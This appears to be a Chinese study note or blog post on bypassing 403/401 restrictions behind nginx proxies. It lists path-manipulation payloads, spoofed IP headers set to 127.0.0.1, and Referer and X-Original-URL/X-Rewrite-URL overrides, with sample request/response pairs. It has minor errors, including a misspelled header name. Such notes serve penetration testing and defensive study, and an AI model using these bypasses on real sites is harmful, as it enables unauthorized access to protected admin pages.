一直想学习下403绕过，换了新公司后终于有时间可以学习下

简单概括下漏洞原理：
当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下：

# 01 修改URL扩展名
```
site.com/admin => 403

site.com/admin/ => 200
site.com/random-dir/../admin => 200
site.com/random-dir/..;/admin => 200
site.com/random-dir/..%252F/admin => 200
site.com/admin// => 200
site.com//admin// => 200
site.com/admin/* => 200
site.com/admin/*/ => 200
site.com/admin/. => 200
site.com/admin/./ => 200
site.com/./admin/./ => 200
site.com/admin/./. => 200
site.com/admin/./. => 200
site.com/admin? => 200
site.com/admin?? => 200
site.com/admin??? => 200
site.com/admin..;/ => 200
site.com/admin/..;/ => 200
site.com/%2f/admin => 200
site.com/%2e/admin => 200
site.com/admin%20/ => 200
site.com/admin%09/ => 200
site.com/%20admin%20/ => 200
site.com/%0dadmin => 200
```
# 01 修改代理IP
```
- X-Originating-IP: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Client-IP: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwared-Host: 127.0.0.1
- X-Host: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
```
示例代码
```
Request
GET /auth/login HTTP/1.1
Response
HTTP/1.1 401 Unauthorized

Reqeust
GET /auth/login HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1
Response
HTTP/1.1 200 OK
```
# 02 修改Referer标头
Referer请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，示例代码如下：
```
Request
GET /auth/login HTTP/1.1
Host: xxx
Response
HTTP/1.1 403 Forbidden

Reqeust
GET / HTTP/1.1
Host: xxx
Referer:https://xxx/auth/login
Response
HTTP/1.1 200 OK

or

Reqeust
GET /auth/login HTTP/1.1
Host: xxx
Referer:https://xxx/auth/login
Response
HTTP/1.1 200 OK
```
# 03 覆盖请求URL
如果目标支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制，示例代码如下：
```
Request
  GET /auth/login HTTP/1.1
  Response
  HTTP/1.1 403 Forbidden

Reqeust
  GET / HTTP/1.1
  X-Original-URL: /auth/login
  Response
  HTTP/1.1 200 OK

or

Reqeust
  GET / HTTP/1.1
  X-Rewrite-URL: /auth/login
  Response
  HTTP/1.1 200 OK

```
# 04 修改HOST（这块原文讲的不是很清楚，看到的不是很明白）
我们先说下Host在请求头中的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个web系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。而很多 WEB 应用通过获取 HTTP HOST 头来获得当前请求访问的位置，但是很多开发人员并未意识到 HTTP HOST 头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。
# 05 端口利用
全端口扫描后，在其他端口可能会发现可未授权访问的web系统

# 参考文章

https://blog.csdn.net/st3pby/article/details/128485994